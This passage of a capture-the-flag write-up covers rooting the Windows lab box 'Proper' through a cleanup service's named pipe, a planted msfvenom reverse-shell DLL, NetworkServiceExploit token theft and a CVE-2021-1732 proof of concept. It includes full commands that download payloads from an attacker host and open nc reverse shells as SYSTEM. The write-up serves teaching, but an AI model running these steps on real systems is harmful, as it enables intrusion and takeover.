+<li>Runs <code class="language-plaintext highlighter-rouge">cmd /c SCHTASKS /RUN /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting"</code></li>
+<li>Deletes <code class="language-plaintext highlighter-rouge">c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\a_b_c_d_e</code></li>
+<li>Connects to the shell on 127.0.0.1:443.</li>
+</ul>
+<p>I can do these steps without the binary.</p>
+<p>I’ll make the directory above, and upload the <code class="language-plaintext highlighter-rouge">Report.wer</code> from GitHub into it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">mkdir</span><span class="w"> </span><span class="nx">C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e</span><span class="w">       
+</span><span class="go">    Directory: C:\programdata\microsoft\windows\wer\reportqueue
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/16/2021  10:38 AM                a_b_c_d_e
+
+</span><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://10.10.14.10/Report.wer</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e\Report.wer</span><span class="w">
+</span></code></pre></div></div>
+<p>Now I’ll trigger the error reporting task:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">SCHTASKS</span><span class="w"> </span><span class="nx">/RUN</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"Microsoft\Windows\Windows Error Reporting\QueueReporting"</span><span class="w">
+</span><span class="go">SUCCESS: Attempted to run the scheduled task "Microsoft\Windows\Windows Error Reporting\QueueReporting".
+</span></code></pre></div></div>
+<p>There’s now a shell listening on 1337:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">1337</span><span class="w">
+</span><span class="go">  TCP    127.0.0.1:1337         0.0.0.0:0              LISTENING       1560
+</span></code></pre></div></div>
+<p>I could create a tunnel to it, or just upload <code class="language-plaintext highlighter-rouge">nc</code> and connect locally. I’ll do the later:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\nc64.exe</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nx">1337</span><span class="w">
+</span><span class="go">
+Microsoft Windows [Version 10.0.17763.1728]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\Windows\system32&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w">
+</span><span class="go">nt authority\system
+</span></code></pre></div></div>
+<p>I can now get the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Windows\system32&gt;</span><span class="w"> </span><span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
+<span class="go">30af35b8************************
+</span></code></pre></div></div>
+<h2 id="beyond-root---other-roots">Beyond Root - Other Roots</h2>
+<h3 id="arbitrary-read">Arbitrary Read</h3>
+<h4 id="sniff-pipe">Sniff Pipe</h4>
+<p>I heard that other solved this challenge by converting the cleanup processes into arbitrary read as well as write. To do this, I’ll show a tool called <a href="https://ioninja.com/plugins/pipe-monitor.html">Pipe Monitor</a> from IONinja. The tool only comes with a free 7-day license, but that’s enough to solve this part.</p>
+<p>I’ll install it in my Windows VM, start it, and create a new session. In the window, I’ll select “Pipe Monitor” and make sure to check the “Run as Administrator” box. Then I’ll click OK, and click on the Capture icon on the right to start a capture:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210316152720464.webp" type="image/webp"/>
+<img alt="image-20210316152720464" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210316152720464.png"/>
+</picture>
+<p>With the server already started, and a file old enough to be cleaned up in place, I’ll run the <code class="language-plaintext highlighter-rouge">client.exe</code>. The communications between client and server are exposed. The client is sending the command <code class="language-plaintext highlighter-rouge">CLEAN [path]\n</code> to the pipe. I’ll restore the file, and it’s also just sent as commands in plaintext into the pipe:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210316151243797.webp" type="image/webp"/>
+<img alt="image-20210316151243797" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210316151243797.png"/>
+</picture>
+<h4 id="powershell-client">PowerShell Client</h4>
+<p><code class="language-plaintext highlighter-rouge">client.exe</code> only checks in the users <code class="language-plaintext highlighter-rouge">Downloads</code> directory. But if I write my own client, I can send whatever files I want over the pipe.</p>
+<p>I’ll create a handle to the pipe and connect to it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="nv">$pipe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.Pipes.NamedPipeClientStream</span><span class="p">(</span><span class="s2">"\\.\cleanupPipe"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="nv">$pipe</span><span class="o">.</span><span class="nf">Connect</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
+<p>Now I’ll create a <code class="language-plaintext highlighter-rouge">StreamWriter</code> object to write into the pipe:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="nv">$sw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.StreamWriter</span><span class="p">(</span><span class="nv">$pipe</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="nv">$sw</span><span class="o">.</span><span class="nf">AutoFlush</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll clean <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="nv">$sw</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="s2">"CLEAN C:\users\administrator\desktop\root.txt</span><span class="se">`n</span><span class="s2">"</span><span class="p">)</span><span class="w">  
+</span></code></pre></div></div>
+<p>It worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">\programdata\cleanup</span><span class="w">
+</span><span class="go">
+
+    Directory: C:\programdata\cleanup
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        3/16/2021  12:37 PM            192 QzpcdXNlcnNcYWRtaW5pc3RyYXRvclxkZXNrdG9wXHJvb3QudHh0                  
+</span></code></pre></div></div>
+<p>That’s <code class="language-plaintext highlighter-rouge">root.txt</code>. I’ll copy it to <code class="language-plaintext highlighter-rouge">\programdata</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"QzpcdXNlcnNcYWRtaW5pc3RyYXRvclxkZXNrdG9wXHJvb3QudHh0"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">C:\users\administrator\desktop\root.txt
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"C:</span><span class="se">\\</span><span class="s2">programdata</span><span class="se">\\</span><span class="s2">0xdf.txt"</span> | <span class="nb">base64</span>
+<span class="go">QzpccHJvZ3JhbWRhdGFcMHhkZi50eHQ=
+PS C:\&gt; copy \programdata\cleanup\QzpcdXNlcnNcYWRtaW5pc3RyYXRvclxkZXNrdG9wXHJvb3QudHh0 \programdata\cleanup\Qzpwcm9ncmFtZGF0YTB4ZGYudHh0
+</span></code></pre></div></div>
+<p>I can restore it the way I did before, and there’s the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"C:\program files\cleanup\client.exe"</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">C:\programdata\0xdf.txt</span><span class="w">                    
+</span><span class="go">Restoring C:\programdata\0xdf.txt
+
+</span><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">C:\programdata\0xdf.txt</span><span class="w">
+</span><span class="go">30af35b8************************
+</span></code></pre></div></div>
+<h3 id="via-networkservice">Via NetworkService</h3>
+<p>This is just another way to abuse the arbitrary write. This path takes two hops to get to SYSTEM, first through the network service user.</p>
+<h4 id="shell-as-network-service">Shell as network service</h4>
+<p>I need a DLL payload, and AV isn’t causing issues on this box, so I’ll create one with <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nt">-f</span> dll <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="o">&gt;</span> rev.dll
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 8704 bytes
+</span></code></pre></div></div>
+<p>I’ll upload it to Proper, change the times, clean it to get it into storage:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="nx">10.10.14.10/rev.dll</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">rev.dll</span><span class="w">
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="nv">$f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"rev.dll"</span><span class="w">
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="nf">creationTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="nf">LastaccessTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Get-Date</span><span class="w"> </span><span class="s2">"1/1/2021 6:00 am"</span><span class="p">)</span><span class="w">
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"C:\program files\cleanup\client.exe"</span><span class="w">
+</span><span class="go">Cleaning C:\Users\web\Downloads
+</span><span class="gp">PS C:\Users\web\Downloads&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="nx">\programdata\cleanup</span><span class="w">
+</span><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="n">dir</span><span class="w">
+</span><span class="go">
+
+    Directory: C:\programdata\cleanup
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----        3/17/2021   1:22 PM          34872 QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xyZXYuZGxs
+</span></code></pre></div></div>
+<p>I want to move this file to <code class="language-plaintext highlighter-rouge">system32</code> as <code class="language-plaintext highlighter-rouge">tzres.dll</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">bem</span><span class="se">\t</span><span class="s2">zres.dll"</span> | <span class="nb">base64</span> 
+<span class="go">QzpcV2luZG93c1xTeXN0ZW0zMlx3YmVtXHR6cmVzLmRsbA==
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="n">copy</span><span class="w"> </span><span class="nx">QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xyZXYuZGxs</span><span class="w"> </span><span class="nx">QzpcV2luZG93c1xTeXN0ZW0zMlx3YmVtXHR6cmVzLmRsbA</span><span class="o">==</span><span class="w">
+</span><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"C:\program files\cleanup\client.exe"</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">C:\Windows\System32\wbem\tzres.dll</span><span class="w">
+</span><span class="go">Restoring C:\Windows\System32\wbem\tzres.dll
+</span></code></pre></div></div>
+<p>This DLL is called by the <code class="language-plaintext highlighter-rouge">systeminfo</code> command, so running that will trigger a reverse shell to me as network service:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata\cleanup&gt;</span><span class="w"> </span><span class="n">systeminfo</span><span class="w">
+</span><span class="go">systeminfo
+ERROR: The remote procedure call failed.
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 49680
+Microsoft Windows [Version 10.0.17763.1728]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\network service
+</span></code></pre></div></div>
+<h4 id="shell-as-system">Shell as SYSTEM</h4>
+<p>network service does have <code class="language-plaintext highlighter-rouge">SeImpresonatePrivilege</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\ProgramData&gt;</span><span class="nb">whoami</span> /priv
+<span class="go">
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></code></pre></div></div>
+<p>So I could run <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> to get a shell from here. There’s also <a href="https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html">this post</a> by Forshaw, which details how to target the RPCSS service process, which also runs as NETWORK SERVICE and almost always has tokens for SYSTEM. The post goes into how to steal them. And Decoder <a href="https://github.com/decoder-it/NetworkServiceExploit">wrote an executable</a> to just do that automatically.</p>
+<p>I’ll download Decoder’s repo into a Windows VM, double click the <code class="language-plaintext highlighter-rouge">.sln</code> file to open it in Visual Studio, and select build. Once that succeeds, I’ll copy the resulting <code class="language-plaintext highlighter-rouge">.exe</code> back to my Parrot VM, and upload it to Proper.</p>
+<p>Running it prints the syntax:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\ProgramData&gt;</span>.<span class="se">\N</span>etworkServiceExploit.exe
+<span class="go">NetworkServiceExploit.exe:
+         -c &lt;command&gt;
+         -i interactive mode
+         -l list unique tokens
+         -p &lt;pid&gt; specific pid to look for
+</span></code></pre></div></div>
+<p>Some playing around with it reveals that if I don’t use <code class="language-plaintext highlighter-rouge">-i</code>, it doesn’t show me output or wait for a return. Once I figured that out, it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\ProgramData&gt;</span>.<span class="se">\N</span>etworkServiceExploit.exe <span class="nt">-i</span> <span class="nt">-c</span> <span class="nb">whoami</span>
+<span class="go">[*] Creating Pipe: frAQBc8Wsa1
+[*] Listening on pipe \\.\pipe\frAQBc8Wsa1, waiting for client to connect
+[*] Client connected!
+[*] Enumerating tokens...Done!
+[*] Processing tokens, looking for NT AUTHORITY\DECODER... just kidding ;-) looking for:NT AUTHORITY\SYSTEM...
+[+] Requested token found!!!
+[*] Attempting to create new child process and communicate via anonymous pipe
+
+nt authority\system
+[*] Returning from exited process
+</span></code></pre></div></div>
+<p>I can just use the <code class="language-plaintext highlighter-rouge">nc64.exe</code> already on Proper to get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\ProgramData&gt;</span>.<span class="se">\N</span>etworkServiceExploit.exe <span class="nt">-c</span> <span class="s2">"</span><span class="se">\p</span><span class="s2">rogramdata</span><span class="se">\n</span><span class="s2">c64.exe -e cmd 10.10.14.10 443"</span> <span class="nt">-i</span>
+<span class="go">.\NetworkServiceExploit.exe -c "\programdata\nc64.exe -e cmd 10.10.14.10 443" -i
+[*] Creating Pipe: frAQBc8Wsa1
+[*] Listening on pipe \\.\pipe\frAQBc8Wsa1, waiting for client to connect
+[*] Client connected!
+[*] Enumerating tokens...Done!
+[*] Processing tokens, looking for NT AUTHORITY\DECODER... just kidding ;-) looking for:NT AUTHORITY\SYSTEM...
+[+] Requested token found!!!
+[*] Attempting to create new child process and communicate via anonymous pipe
+</span></code></pre></div></div>
+<p>It hangs there, but at <code class="language-plaintext highlighter-rouge">nc</code> there’s a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 49696
+Microsoft Windows [Version 10.0.17763.1728]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\ProgramData&gt;whoami
+nt authority\system
+</span></code></pre></div></div>
+<h3 id="cve-2021-1732">CVE-2021-1732</h3>
+<p>This <a href="https://github.com/KaLendsi/CVE-2021-1732-Exploit">really slick POC for CVE-2021-1732</a> was published about a week and a half before Proper’s release, and Proper was vulnerable to it at it’s release (though I don’t know of anyone who first solved it this way).</p>
+<p>I’ll download the repo to my windows VM, open it in Visual Studio, and build it as is. There are a bunch of warnings, but it succeeds:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210316155405896.webp" type="image/webp"/>
+<img alt="image-20210316155405896" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210316155405896.png"/>
+</picture>
+<p>I’ll copy that output exe to my Parrot VM, and then upload it to Proper:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://10.10.14.10/ExploitTest.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">e.exe</span><span class="w">
+</span></code></pre></div></div>
+<p>The gif on GitHub shows it running as <code class="language-plaintext highlighter-rouge">Exploit.exe whoami</code>, so I’ll give that a try. It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\e.exe</span><span class="w"> </span><span class="nx">whoami</span><span class="w">                                               
+</span><span class="go">.\e.exe whoami                               
+Press any key to continue . . .              
+
+CreateWnd                                    
+Hwnd:0015006e   qwfirstEntryDesktop=000001F1FD601AF0
+BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
+Hwnd:000a005e   qwfirstEntryDesktop=000001F1FD601CB0
+BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
+Hwnd:000a009a   qwfirstEntryDesktop=000001F1FD601E70
+BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
+Hwnd:000d0098   qwfirstEntryDesktop=000001F1FD602030
+BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
+Hwnd:0010007a   qwfirstEntryDesktop=000001F1FD6021F0
+BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
+Hwnd:00c9002e   qwfirstEntryDesktop=000001F1FD6023B0
+BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
+Hwnd:000e007c   qwfirstEntryDesktop=000001F1FD602570
+BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
+Hwnd:000a0092   qwfirstEntryDesktop=000001F1FD602730
+BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
+Hwnd:000200a2   qwfirstEntryDesktop=000001F1FD6028F0
+BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
+Hwnd:000300a0   qwfirstEntryDesktop=000001F1FD602AB0
+BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
+Min BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
+MagciHwnd==00000000000400A0                  
+realMagicHwnd=00000000000400A0               
+dwRet=0000000000001E20                       
+tagWndMin_offset_0x128=0000000000001E20
+g_qwExpLoit=FFFFF634C08223C0                 
+qwFrist read=FFFFF634C0834140                
+qwSecond read=FFFFD1886DE11810               
+qwSecond read=FFFFF634C26D0000               
+qwFourth read=FFFFF634C07AF010               
+qwFifth read=FFFFD18870D48080                
+qwSixth read=FFFFD1886CB71080                
+[*] Trying to execute whoami as SYSTEM
+[+] ProcessCreated with pid 4020!            
+===============================              
+nt authority\system                          
+
+Press any key to continue . . .
+</span></code></pre></div></div>
+<p>I’ll try a reverse shell with <code class="language-plaintext highlighter-rouge">nc64.exe</code> that I uploaded earlier:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\e.exe</span><span class="w"> </span><span class="s2">"\programdata\nc64.exe -e powershell 10.10.14.10 443"</span><span class="w">
+</span><span class="go">Press any key to continue . . . 
+</span></code></pre></div></div>
+<p>It hangs, but there’s a shell at another <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 49687
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\programdata&gt; whoami
+nt authority\system
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/08/21/htb-proper.html"></a>
+</article>
